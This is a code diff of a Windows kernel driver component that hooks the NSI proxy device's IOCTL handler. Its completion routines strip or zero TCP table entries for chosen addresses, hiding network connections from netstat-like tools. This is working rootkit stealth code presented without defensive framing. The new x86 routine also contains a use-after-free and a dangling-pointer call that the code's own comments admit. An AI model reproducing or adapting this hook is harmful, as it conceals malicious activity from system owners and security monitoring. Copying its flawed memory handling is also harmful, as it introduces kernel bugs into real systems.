@@ -66,7 +66,7 @@ BOOLEAN NsiHook::NetNSIFreeHook()
 }
 
 #if DBG
-static VOID PrintSocketAddr(ULONG localIP, USHORT localPort, ULONG foreignIP, USHORT foreignPort)
+static VOID PrintSocketAddr(ULONG localIP, USHORT localPort, ULONG foreignIP)
 {
 	union
 	{
@@ -74,7 +74,7 @@ static VOID PrintSocketAddr(ULONG localIP, USHORT localPort, ULONG foreignIP, US
 		UCHAR portbytes[2];
 	}port;
 
-	ULONG localbytes[4];
+	ULONG localbytes[4]{};
 	localbytes[0] = localIP & 0xFF;
 	localbytes[1] = (localIP >> 8) & 0xFF;
 	localbytes[2] = (localIP >> 16) & 0xFF;
@@ -85,18 +85,96 @@ static VOID PrintSocketAddr(ULONG localIP, USHORT localPort, ULONG foreignIP, US
 	DbgPrint("%d.%d.%d.%d:%d\t", localbytes[0], localbytes[1], localbytes[2], localbytes[3], port.port);
 
 
-	ULONG foreignbytes[4];
+	ULONG foreignbytes[4]{};
 	foreignbytes[0] = foreignIP & 0xFF;
 	foreignbytes[1] = (foreignIP >> 8) & 0xFF;
 	foreignbytes[2] = (foreignIP >> 16) & 0xFF;
 	foreignbytes[3] = (foreignIP >> 24) & 0xFF;
-
-	port.port = 0;
-	port.portbytes[0] = (foreignPort >> 8) & 0xFF;
-	port.portbytes[1] = foreignPort & 0xFF;
-	DbgPrint("%d.%d.%d.%d:%d\t", foreignbytes[0], foreignbytes[1], foreignbytes[2], foreignbytes[3], port.port);
+	DbgPrint("%d.%d.%d.%d\n", foreignbytes[0], foreignbytes[1], foreignbytes[2], foreignbytes[3]);
 }
 #endif
+
+NTSTATUS NsiHook::NetNSIProxyCompletionRoutineX86(
+	IN PDEVICE_OBJECT DeviceObject,
+	IN PIRP Irp,
+	IN PVOID Context)
+{
+	KAPC_STATE ApcState{};
+	PHOOKED_IO_COMPLETION HookedContext = (PHOOKED_IO_COMPLETION)Context;
+	if (!NT_SUCCESS(Irp->IoStatus.Status))
+	{
+		goto free_exit;
+	}
+
+	NSI_PARAM* NsiParam = (NSI_PARAM*)(Irp->UserBuffer);
+	if (!MmIsAddressValid(NsiParam->lpMem))
+	{
+		goto free_exit;
+	}
+
+#if DBG
+	if ((NsiParam->UnknownParam8 != 0x38))
+	{
+		KdPrint(("NetNSIProxyCompletionRoutine: NsiParam->UnknownParam8:[0x%x]\n", NsiParam->UnknownParam8));
+	}
+#endif
+
+	KeStackAttachProcess(HookedContext->RequestingProcess, &ApcState);
+	PNSI_STATUS_ENTRY pStatusEntry = (PNSI_STATUS_ENTRY)NsiParam->lpStatus;
+	PINTERNAL_TCP_TABLE_ENTRY pTcpEntry = (PINTERNAL_TCP_TABLE_ENTRY)NsiParam->lpMem;
+	DWORD numOfEntries = NsiParam->TcpConnCount;
+	for (DWORD i = 0; i < numOfEntries; i++)
+	{
+#if DBG
+		PrintSocketAddr(pTcpEntry[i].localEntry.dwIP, pTcpEntry[i].localEntry.Port,
+			pTcpEntry[i].remoteEntry.dwIP);
+#endif
+
+		if (NetHook::NetIsHiddenIpAddress(pTcpEntry[i].localEntry.dwIP,
+			pTcpEntry[i].localEntry.Port,
+			pTcpEntry[i].remoteEntry.dwIP))
+		{
+			// RtlZeroMemory(&pTcpEntry[i], sizeof(INTERNAL_TCP_TABLE_ENTRY));
+
+			// NSI will map status array entry to tcp table array entry
+			// we must modify both synchronously
+			RtlCopyMemory(&pTcpEntry[i], &pTcpEntry[i + 1], sizeof(INTERNAL_TCP_TABLE_ENTRY) * (numOfEntries - i));
+			RtlCopyMemory(&pStatusEntry[i], &pStatusEntry[i + 1], sizeof(NSI_STATUS_ENTRY) * (numOfEntries - i));
+			numOfEntries--;
+			NsiParam->TcpConnCount--;
+			i--;
+		}
+	}
+
+	KeUnstackDetachProcess(&ApcState);
+
+free_exit:
+
+	IoGetNextIrpStackLocation(Irp)->Context = HookedContext->OriginalContext;
+	IoGetNextIrpStackLocation(Irp)->CompletionRoutine = HookedContext->OriginalCompletionRoutine;
+
+	ExFreePoolWithTag(HookedContext, TAG_NET);
+
+	//
+	// ERR: There's a use after free here.
+	//
+	if ((HookedContext != nullptr) && (HookedContext->InvokeOnSuccess) && IoGetNextIrpStackLocation(Irp)->CompletionRoutine)
+	{
+		//
+		// ERR: Pass a Dangling Context Argument
+		//
+		return IoGetNextIrpStackLocation(Irp)->CompletionRoutine(DeviceObject, Irp, Context);
+	}
+	else
+	{
+		if (Irp->PendingReturned)
+		{
+			IoMarkIrpPending(Irp);
+		}
+	}
+
+	return STATUS_SUCCESS;
+}
 
 NTSTATUS NsiHook::NetNSIProxyCompletionRoutine(
 	IN PDEVICE_OBJECT DeviceObject,
@@ -110,41 +188,38 @@ NTSTATUS NsiHook::NetNSIProxyCompletionRoutine(
 		goto free_exit;
 	}
 
-	NSI_PARAM<SIZE_T>* NsiParam = (NSI_PARAM<SIZE_T> *)Irp->UserBuffer;	
-	if (!MmIsAddressValid(NsiParam->lpMem))
+	PNSI_STRUCTURE_1 NsiParam = (PNSI_STRUCTURE_1)Irp->UserBuffer;
+	if (!MmIsAddressValid(NsiParam->Entries))
 	{
 		goto free_exit;
 	}
 
-	if ((NsiParam->UnknownParam8 != 0x38))
+	if (NsiParam->EntrySize != sizeof(NSI_STRUCTURE_ENTRY))
 	{
-		KdPrint(("NsiParam->UnknownParam8:[0x%x]\n", NsiParam->UnknownParam8));
+		goto free_exit;
 	}
 
 	KeStackAttachProcess(HookedContext->RequestingProcess, &ApcState);
-	PNSI_STATUS_ENTRY pStatusEntry = (PNSI_STATUS_ENTRY)NsiParam->lpStatus;
-	PINTERNAL_TCP_TABLE_ENTRY pTcpEntry = (PINTERNAL_TCP_TABLE_ENTRY)NsiParam->lpMem;
-	SIZE_T numOfEntries = NsiParam->TcpConnCount;
+	PINTERNAL_TCP_TABLE_ENTRY pTcpEntry = (PINTERNAL_TCP_TABLE_ENTRY)NsiParam->Entries;
+
+#if DBG
+	PNSI_STRUCTURE_ENTRY NsiBufferEntries = &(NsiParam->Entries->EntriesStart[0]);
+#endif 
+
+	SIZE_T numOfEntries = NsiParam->NumberOfEntries;	
 	for (SIZE_T i = 0; i < numOfEntries; i++)
 	{
 #if DBG
+		ASSERT(NsiBufferEntries[i].IpAddress == pTcpEntry[i].remoteEntry.dwIP);
 		PrintSocketAddr(pTcpEntry[i].localEntry.dwIP, pTcpEntry[i].localEntry.Port,
-			pTcpEntry[i].remoteEntry.dwIP, pTcpEntry->remoteEntry.Port);
+			pTcpEntry[i].remoteEntry.dwIP);
 #endif
 
 		if (NetHook::NetIsHiddenIpAddress(pTcpEntry[i].localEntry.dwIP,
 			pTcpEntry[i].localEntry.Port,
 			pTcpEntry[i].remoteEntry.dwIP))
 		{
-			// RtlZeroMemory(&pTcpEntry[i], sizeof(INTERNAL_TCP_TABLE_ENTRY));
-			
-			// NSI will map status array entry to tcp table array entry
-			// we must modify both synchronously
-			RtlCopyMemory(&pTcpEntry[i], &pTcpEntry[i + 1], sizeof(INTERNAL_TCP_TABLE_ENTRY) * (numOfEntries - i));
-			RtlCopyMemory(&pStatusEntry[i], &pStatusEntry[i + 1], sizeof(NSI_STATUS_ENTRY) * (numOfEntries - i));
-			numOfEntries--;
-			NsiParam->TcpConnCount--;
-			i--;
+			RtlZeroMemory(&pTcpEntry[i], sizeof(INTERNAL_TCP_TABLE_ENTRY));
 		}
 	}
 
@@ -187,21 +262,6 @@ NTSTATUS NsiHook::NetNSIProxyDeviceControlHook(
 
 	if (IOCTL_NSI_GETALLPARAM == io_control_code)
 	{
-#if DBG
-		if ((IrpStack->Parameters.DeviceIoControl.InputBufferLength == 112 || IrpStack->Parameters.DeviceIoControl.InputBufferLength == 60))
-		{
-			_declspec(align(sizeof(32))) NSI_PARAM<SIZE_T> param_test{};
-			KdPrint(("InputBufferLength:%lu sizeof(NSI_PARAM<SIZE_T>):%lu sizeof(param_test):%lu\n",
-				IrpStack->Parameters.DeviceIoControl.InputBufferLength, 
-				sizeof(NSI_PARAM<SIZE_T>), 
-				sizeof(param_test)));
-		}
-		else
-		{
-			KdPrint(("Unknown Length: InputBufferLength:%lu\n", IrpStack->Parameters.DeviceIoControl.InputBufferLength));
-		}
-#endif
-
 		//if call is relevent hook the CompletionRoutine
 		PHOOKED_IO_COMPLETION hook = (PHOOKED_IO_COMPLETION)ExAllocatePool2(POOL_FLAG_NON_PAGED, sizeof(HOOKED_IO_COMPLETION), TAG_NET);
 		if (hook == nullptr)
@@ -213,9 +273,30 @@ NTSTATUS NsiHook::NetNSIProxyDeviceControlHook(
 		hook->OriginalCompletionRoutine = IrpStack->CompletionRoutine;
 		hook->OriginalContext = IrpStack->Context;
 
-		IrpStack->Context = hook;
-		IrpStack->CompletionRoutine = NetNSIProxyCompletionRoutine;
+		IrpStack->Context = hook;		
 
+		if (IrpStack->Parameters.DeviceIoControl.InputBufferLength == sizeof(_NSI_STRUCTURE_1))
+		{
+			KdPrint(("InputBufferLength:[%lu] sizeof(NSI_STRUCTURE):[%zu]\n",
+				IrpStack->Parameters.DeviceIoControl.InputBufferLength, sizeof(_NSI_STRUCTURE_1)));
+			IrpStack->CompletionRoutine = NetNSIProxyCompletionRoutine;
+		}
+		else if (IrpStack->Parameters.DeviceIoControl.InputBufferLength == sizeof(NSI_PARAM))
+		{
+			KdPrint(("InputBufferLength:%lu sizeof(NSI_PARAM):%zu\n",
+				IrpStack->Parameters.DeviceIoControl.InputBufferLength, sizeof(NSI_PARAM)));
+			IrpStack->CompletionRoutine = NetNSIProxyCompletionRoutineX86;
+		}
+		else
+		{
+			KdPrint(("InputBufferLength:%lu. Calling Original IO Function.\n",
+				IrpStack->Parameters.DeviceIoControl.InputBufferLength));
+
+			//call the original DeviceIoControl func
+			ExFreePoolWithTag(hook, TAG_NET);
+			return g_NetOldNSIProxyDeviceControl(DeviceObject, Irp);
+		}	
+		
 		hook->RequestingProcess = PsGetCurrentProcess();
 		hook->InvokeOnSuccess = (IrpStack->Control & SL_INVOKE_ON_SUCCESS) ? TRUE : FALSE;
 
